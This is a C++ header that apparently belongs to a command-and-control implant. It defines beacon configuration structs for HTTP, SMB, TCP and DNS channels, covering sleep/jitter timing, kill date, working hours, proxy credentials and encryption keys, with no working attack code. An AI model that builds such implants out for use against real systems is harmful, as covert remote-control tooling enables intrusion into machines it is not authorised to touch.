#pragma once

#include <windows.h>

#ifndef PROFILE_STRUCT
#define PROFILE_STRUCT

// Proxy type definitions
#define PROXY_TYPE_NONE     0
#define PROXY_TYPE_HTTP     1
#define PROXY_TYPE_HTTPS    2

typedef struct {
	ULONG  servers_count;
	BYTE** servers;
	WORD*  ports;
	BOOL   use_ssl;
	BYTE*  http_method;
	BYTE*  uri;
	BYTE*  parameter;
	BYTE*  user_agent;
	BYTE*  http_headers;
	ULONG  ans_pre_size;
	ULONG  ans_size;
	// Proxy settings
	BYTE   proxy_type;      // 0=none, 1=http, 2=https
	BYTE*  proxy_host;
	WORD   proxy_port;
	BYTE*  proxy_username;
	BYTE*  proxy_password;
} ProfileHTTP;

typedef struct {
	BYTE* pipename;
} ProfileSMB;

typedef struct {
	BYTE* prepend;
	WORD  port;
} ProfileTCP;

typedef struct {
	BYTE* domain;
	BYTE* resolvers;
	BYTE* qtype;       
	ULONG pkt_size;     
	ULONG label_size;   
	ULONG ttl;          
	BYTE* encrypt_key;  
	ULONG burst_enabled;
	ULONG burst_sleep;
	ULONG burst_jitter;
} ProfileDNS;

#endif



class AgentConfig
{
public:
	BOOL active;

	ULONG agent_type;
	ULONG listener_type;
	BYTE* encrypt_key;
	ULONG sleep_delay;
	ULONG jitter_delay;
	ULONG kill_date;
	ULONG working_time;

	BYTE  exit_method;
	ULONG exit_task_id;
	ULONG download_chunk_size;

#if defined(BEACON_HTTP)
	ProfileHTTP profile;

#elif defined(BEACON_SMB)
	ProfileSMB profile;

#elif defined(BEACON_TCP)
	ProfileTCP profile;

#elif defined(BEACON_DNS)
	ProfileDNS profile;

#endif

	AgentConfig();

	static void* operator new(size_t sz);
	static void operator delete(void* p) noexcept;
};
